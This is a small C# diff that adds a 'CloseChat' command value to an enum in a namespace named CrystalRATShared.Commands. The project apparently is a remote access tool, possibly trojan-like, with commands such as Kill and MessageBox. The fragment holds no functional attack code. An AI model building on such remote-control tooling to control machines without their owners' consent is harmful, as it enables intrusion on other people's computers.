@@ -18,6 +18,6 @@ namespace CrystalRATShared.Commands
         Kill = 7,
         MessageBox = 8,
         ChatMessage = 9,
-
+        CloseChat = 10,
     }
 }
